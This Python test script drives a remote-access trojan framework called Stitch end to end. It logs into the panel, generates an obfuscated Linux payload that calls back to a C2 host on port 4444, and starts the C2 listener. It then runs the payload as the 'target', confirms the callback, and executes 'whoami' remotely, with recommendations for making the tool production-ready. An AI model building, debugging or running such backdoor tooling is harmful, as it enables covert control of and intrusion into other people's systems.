#!/usr/bin/env python3
"""
REAL USER PERSPECTIVE TEST
Test exactly as a user would actually use the system
No shortcuts, no fake data - real end-to-end testing
"""

import os
import sys
import subprocess
import time
import socket
import requests
import json
import shutil
from pathlib import Path

sys.path.insert(0, '/workspace')

class RealUserTest:
    def __init__(self):
        self.issues = []
        self.successes = []
        self.warnings = []
        
        # Clean start
        print("[SETUP] Killing any existing processes...")
        subprocess.run("pkill -f 'python.*stitch' 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("pkill -f 'python.*web' 2>/dev/null", shell=True, capture_output=True)
        time.sleep(2)
        
    def step1_user_starts_system(self):
        """Step 1: User starts the system"""
        print("\n" + "="*70)
        print("STEP 1: USER STARTS THE SYSTEM")
        print("="*70)
        print("A user would run: python3 main.py or start the web server\n")
        
        # Try starting the main web app as a user would
        print("[USER ACTION] Starting web application...")
        
        # Create startup script as user would use
        startup_script = '''
import sys
import os
sys.path.insert(0, '/workspace')

# User sets credentials
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'MySecurePassword123!'

# Fix for password hashing
from werkzeug.security import generate_password_hash
import web_app_real
web_app_real.USERS = {'admin': generate_password_hash('MySecurePassword123!')}

# Start web server
from web_app_real import app, socketio

print("Starting Stitch Web Interface...")
print("Browse to: http://localhost:5000")
print("Login: admin / MySecurePassword123!")

socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
        
        with open('/tmp/user_start.py', 'w') as f:
            f.write(startup_script)
            
        self.web_process = subprocess.Popen(
            ['python3', '/tmp/user_start.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"  Started web server (PID: {self.web_process.pid})")
        time.sleep(5)
        
        # Check if web is accessible
        try:
            resp = requests.get('http://localhost:5000/login', timeout=3)
            if resp.status_code == 200:
                print("  ✓ Web interface is accessible")
                self.successes.append("Web server starts")
                return True
            else:
                print(f"  ✗ Web returned: {resp.status_code}")
                self.issues.append(f"Web server status: {resp.status_code}")
        except Exception as e:
            print(f"  ✗ Cannot access web: {e}")
            self.issues.append("Web server not accessible")
            return False
            
    def step2_user_opens_browser(self):
        """Step 2: User opens browser and sees login page"""
        print("\n" + "="*70)
        print("STEP 2: USER OPENS BROWSER")
        print("="*70)
        print("User navigates to http://localhost:5000\n")
        
        session = requests.Session()
        
        # Get login page
        resp = session.get('http://localhost:5000/login')
        
        print("[USER SEES] Login page")
        
        # Check what's on the page
        checks = {
            'Login form': '<form' in resp.text,
            'Username field': 'name="username"' in resp.text or 'id="username"' in resp.text,
            'Password field': 'name="password"' in resp.text or 'id="password"' in resp.text,
            'CSRF token': 'csrf_token' in resp.text,
            'Submit button': 'type="submit"' in resp.text
        }
        
        for item, present in checks.items():
            if present:
                print(f"  ✓ {item} present")
            else:
                print(f"  ✗ {item} missing")
                self.issues.append(f"Login page missing: {item}")
                
        if all(checks.values()):
            self.successes.append("Login page complete")
            
        return session
        
    def step3_user_logs_in(self, session):
        """Step 3: User enters credentials and logs in"""
        print("\n" + "="*70)
        print("STEP 3: USER LOGS IN")
        print("="*70)
        print("User enters: admin / MySecurePassword123!\n")
        
        # Extract CSRF token
        resp = session.get('http://localhost:5000/login')
        
        import re
        csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', resp.text)
        
        if not csrf_match:
            print("  ✗ No CSRF token found")
            self.issues.append("CSRF token missing from login")
            return
        csrf_token = csrf_match.group(1)
        
        # Try to login
        login_data = {
            'username': 'admin',
            'password': 'MySecurePassword123!',
            'csrf_token': csrf_token
        }
        
        print("[USER ACTION] Submitting login form...")
        
        resp = session.post('http://localhost:5000/login', data=login_data, allow_redirects=False)
        
        if resp.status_code in [302, 303]:
            print("  ✓ Login successful, redirecting to dashboard")
            self.successes.append("User can login")
            
            # Follow redirect
            resp = session.get('http://localhost:5000/')
            
            # Get CSRF for API
            csrf_match = re.search(r'name="csrf-token".*?content="([^"]+)"', resp.text)
            if csrf_match:
                api_csrf = csrf_match.group(1)
                return session, api_csrf
            else:
                self.warnings.append("No API CSRF token found")
                return session, None
        else:
            print(f"  ✗ Login failed: {resp.status_code}")
            self.issues.append(f"Login failed with status {resp.status_code}")
            return None, None
            
    def step4_user_navigates_dashboard(self, session):
        """Step 4: User sees dashboard"""
        print("\n" + "="*70)
        print("STEP 4: USER SEES DASHBOARD")
        print("="*70)
        
        resp = session.get('http://localhost:5000/')
        
        print("[USER SEES] Dashboard elements:")
        
        # Check dashboard elements
        elements = {
            'Navigation menu': 'nav' in resp.text or 'sidebar' in resp.text,
            'Connections section': 'connections' in resp.text.lower(),
            'Payloads section': 'payload' in resp.text.lower(),
            'Terminal/Execute': 'terminal' in resp.text.lower() or 'execute' in resp.text.lower(),
            'Logout button': 'logout' in resp.text.lower()
        }
        
        for element, present in elements.items():
            if present:
                print(f"  ✓ {element}")
            else:
                print(f"  ⚠ {element} not obvious")
                self.warnings.append(f"Dashboard missing clear: {element}")
                
    def step5_user_generates_payload(self, session, csrf_token):
        """Step 5: User goes to generate a payload"""
        print("\n" + "="*70)
        print("STEP 5: USER GENERATES PAYLOAD")
        print("="*70)
        print("User clicks on Payloads tab and configures payload\n")
        
        if not session:
            print("  ✗ Not logged in")
            self.issues.append("Cannot generate payload - not logged in")
            return
        print("[USER ACTION] Configuring payload:")
        print("  Platform: Linux")
        print("  Host: 192.168.1.100 (their C2 server)")
        print("  Port: 4444")
        print("  ☑ Enable obfuscation")
        
        headers = {}
        if csrf_token:
            headers['X-CSRFToken'] = csrf_token
            
        payload_config = {
            'platform': 'linux',
            'host': '192.168.1.100',
            'port': '4444',
            'name': 'my_payload',
            'obfuscate': True
        }
        
        print("\n[USER ACTION] Clicking 'Generate Payload' button...")
        
        try:
            resp = session.post(
                'http://localhost:5000/api/generate-payload',
                json=payload_config,
                headers=headers
            )
            
            if resp.status_code == 200:
                result = resp.json()
                
                if result.get('success'):
                    print(f"  ✓ Payload generated successfully")
                    print(f"    Type: {result.get('type', 'unknown')}")
                    print(f"    Size: {result.get('size', 'unknown')} bytes")
                    
                    self.successes.append("Payload generation works")
                    
                    # Try to download
                    if result.get('download_url'):
                        return self.step6_user_downloads_payload(session, result['download_url'])
                else:
                    error = result.get('error', 'Unknown error')
                    print(f"  ✗ Generation failed: {error}")
                    self.issues.append(f"Payload generation error: {error}")
                    
            elif resp.status_code == 400:
                print(f"  ✗ Bad request: {resp.text[:100]}")
                self.issues.append("Payload API returns 400")
            elif resp.status_code == 500:
                print(f"  ✗ Server error: {resp.text[:100]}")
                self.issues.append("Payload generation server error")
            else:
                print(f"  ✗ Unexpected response: {resp.status_code}")
                self.issues.append(f"Payload API status: {resp.status_code}")
                
        except Exception as e:
            print(f"  ✗ Request failed: {e}")
            self.issues.append(f"Payload generation exception: {str(e)}")
            
        return
    def step6_user_downloads_payload(self, session, download_url):
        """Step 6: User downloads the generated payload"""
        print("\n" + "="*70)
        print("STEP 6: USER DOWNLOADS PAYLOAD")
        print("="*70)
        
        print(f"[USER ACTION] Clicking download link: {download_url}")
        
        resp = session.get(f'http://localhost:5000{download_url}')
        
        if resp.status_code == 200:
            # Save as user would
            download_path = '/tmp/downloaded_payload'
            
            # Check file type
            content_type = resp.headers.get('Content-Type', '')
            payload_type = resp.headers.get('X-Payload-Type', '')
            
            if 'python' in content_type.lower() or 'text' in content_type.lower() or payload_type == 'python':
                download_path += '.py'
                print("  ℹ Payload is a Python script")
            else:
                # Assume binary
                print("  ℹ Payload appears to be binary")
                
            with open(download_path, 'wb') as f:
                f.write(resp.content)
                
            # Check file
            file_size = len(resp.content)
            print(f"  ✓ Downloaded: {download_path}")
            print(f"    Size: {file_size:,} bytes")
            
            # Check if it's actually executable
            with open(download_path, 'rb') as f:
                header = f.read(4)
                
            if header.startswith(b'\x7fELF'):
                print("    Type: Linux ELF binary ✓")
                self.successes.append("Binary payload downloaded")
            elif header.startswith(b'#!/'):
                print("    Type: Python script")
                self.successes.append("Python payload downloaded")
            else:
                print("    Type: Unknown")
                self.warnings.append("Payload type unclear")
                
            # Make executable
            os.chmod(download_path, 0o755)
            
            return download_path
        else:
            print(f"  ✗ Download failed: {resp.status_code}")
            self.issues.append("Cannot download payload")
            return
    def step7_user_starts_c2(self):
        """Step 7: User starts their C2 server"""
        print("\n" + "="*70)
        print("STEP 7: USER STARTS C2 SERVER")
        print("="*70)
        print("User starts C2 listener on their server\n")
        
        print("[USER ACTION] Running: python3 main.py")
        print("[USER ACTION] stitch> listen 4444")
        
        # Start actual C2
        from Application.stitch_cmd import stitch_server
        
        self.c2_server = stitch_server()
        
        # Start listener in thread
        import threading
        def run_listener():
            self.c2_server.do_listen('4444')
            
        listener_thread = threading.Thread(target=run_listener, daemon=True)
        listener_thread.start()
        
        time.sleep(3)
        
        # Verify listening
        sock = socket.socket()
        result = sock.connect_ex(('127.0.0.1', 4444))
        sock.close()
        
        if result == 0:
            print("\n  ✓ C2 server listening on port 4444")
            self.successes.append("C2 server starts")
            return True
        else:
            print("\n  ✗ C2 server not listening")
            self.issues.append("C2 server won't start")
            return False
            
    def step8_user_runs_payload(self, payload_path):
        """Step 8: User/target runs the payload"""
        print("\n" + "="*70)
        print("STEP 8: TARGET RUNS PAYLOAD")
        print("="*70)
        print("Target executes the downloaded payload\n")
        
        if not payload_path or not os.path.exists(payload_path):
            print("  ✗ No payload to run")
            self.issues.append("No payload available to execute")
            return
        print(f"[TARGET ACTION] Running: {payload_path}")
        
        # Determine how to run
        with open(payload_path, 'rb') as f:
            header = f.read(4)
            
        if header.startswith(b'\x7fELF'):
            # Binary
            cmd = [payload_path]
            print("  Executing as binary...")
        else:
            # Script
            cmd = ['python3', payload_path]
            print("  Executing as Python script...")
            
        # Run payload
        self.payload_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"  Started payload (PID: {self.payload_process.pid})")
        
        # Wait for connection
        time.sleep(3)
        
        # Check if still running
        if self.payload_process.poll() is None:
            print("  ✓ Payload is running")
            return True
        else:
            # Get error output
            stdout, stderr = self.payload_process.communicate()
            print("  ✗ Payload exited immediately")
            print(f"    STDOUT: {stdout[:200]}")
            print(f"    STDERR: {stderr[:200]}")
            self.issues.append("Payload crashes on execution")
            return False
            
    def step9_check_connection(self):
        """Step 9: Check if payload connected to C2"""
        print("\n" + "="*70)
        print("STEP 9: CHECK FOR CONNECTION")
        print("="*70)
        print("User checks C2 for incoming connection\n")
        
        print("[USER SEES] In C2 terminal:")
        
        # Check C2 server connections
        if hasattr(self, 'c2_server') and hasattr(self.c2_server, 'inf_sock'):
            if self.c2_server.inf_sock:
                connections = list(self.c2_server.inf_sock.keys())
                print(f"  ✓ Active connections: {connections}")
                self.successes.append("Payload connects to C2")
                return True
            else:
                print("  ✗ No connections received")
                self.issues.append("Payload doesn't connect to C2")
        else:
            print("  ✗ C2 server not available")
            self.issues.append("C2 server not running")
            
        return False
        
    def step10_user_executes_commands(self, session, csrf_token):
        """Step 10: User tries to execute commands"""
        print("\n" + "="*70)
        print("STEP 10: USER EXECUTES COMMANDS")
        print("="*70)
        print("User tries to run commands on the target\n")
        
        if session and csrf_token:
            print("[USER ACTION] In web interface, executing 'whoami'")
            
            headers = {'X-CSRFToken': csrf_token}
            
            cmd_data = {
                'target': '127.0.0.1',
                'command': 'whoami'
            }
            
            resp = session.post(
                'http://localhost:5000/api/execute',
                json=cmd_data,
                headers=headers
            )
            
            if resp.status_code == 200:
                result = resp.json()
                output = result.get('output', '')
                
                if output and 'error' not in output.lower():
                    print(f"  ✓ Command output: {output[:50]}")
                    self.successes.append("Commands execute successfully")
                else:
                    print(f"  ✗ Command failed: {output[:100]}")
                    self.issues.append("Commands don't execute properly")
            else:
                print(f"  ✗ API error: {resp.status_code}")
                self.issues.append(f"Execute API returns {resp.status_code}")
                
    def cleanup(self):
        """Clean up all processes"""
        print("\n[CLEANUP] Stopping test processes...")
        
        if hasattr(self, 'web_process'):
            self.web_process.terminate()
        if hasattr(self, 'payload_process'):
            self.payload_process.terminate()
            
        subprocess.run("pkill -f 'user_start.py' 2>/dev/null", shell=True, capture_output=True)
        
    def generate_report(self):
        """Generate comprehensive user experience report"""
        print("\n" + "="*70)
        print("USER EXPERIENCE REPORT")
        print("="*70)
        
        print(f"\n[SUCCESSES] ({len(self.successes)})")
        for success in self.successes:
            print(f"  ✓ {success}")
            
        print(f"\n[ISSUES] ({len(self.issues)})")
        if self.issues:
            for issue in self.issues:
                print(f"  ✗ {issue}")
        else:
            print("  None! Everything works")
            
        print(f"\n[WARNINGS] ({len(self.warnings)})")
        for warning in self.warnings:
            print(f"  ⚠ {warning}")
            
        # Overall assessment
        total_steps = 10
        successful_steps = len(self.successes)
        
        print(f"\n[OVERALL SCORE] {successful_steps}/{total_steps}")
        
        if successful_steps >= 9:
            print("\n✅ EXCELLENT - System works end-to-end perfectly")
        elif successful_steps >= 7:
            print("\n⚠️ GOOD - Mostly works with minor issues")
        elif successful_steps >= 5:
            print("\n⚠️ FAIR - Core features work but needs fixes")
        else:
            print("\n❌ POOR - Major issues preventing normal use")
            
        # Specific recommendations
        print("\n[RECOMMENDATIONS]")
        
        if "Payload crashes" in str(self.issues):
            print("  • Fix payload compatibility with generated output")
        if "doesn't connect" in str(self.issues):
            print("  • Fix payload connection protocol")
        if "Binary" not in str(self.successes):
            print("  • Ensure binary compilation works")
        if "Commands don't execute" in str(self.issues):
            print("  • Fix command execution pipeline")
            
        if not self.issues:
            print("  • System is ready for production use")

def main():
    print("="*70)
    print("REAL USER END-TO-END TEST")
    print("="*70)
    print("Testing exactly as a real user would use the system\n")
    
    tester = RealUserTest()
    
    try:
        # Run through all user steps
        if tester.step1_user_starts_system():
            session = tester.step2_user_opens_browser()
            
            if session:
                session, csrf = tester.step3_user_logs_in(session)
                
                if session:
                    tester.step4_user_navigates_dashboard(session)
                    payload_path = tester.step5_user_generates_payload(session, csrf)
                    
                    if payload_path:
                        if tester.step7_user_starts_c2():
                            tester.step8_user_runs_payload(payload_path)
                            tester.step9_check_connection()
                            tester.step10_user_executes_commands(session, csrf)
                            
    except Exception as e:
        print(f"\n[ERROR] Test failed: {e}")
        import traceback
        traceback.print_exc()
        
    finally:
        # Generate report
        tester.generate_report()
        
        # Cleanup
        tester.cleanup()

if __name__ == "__main__":
    main()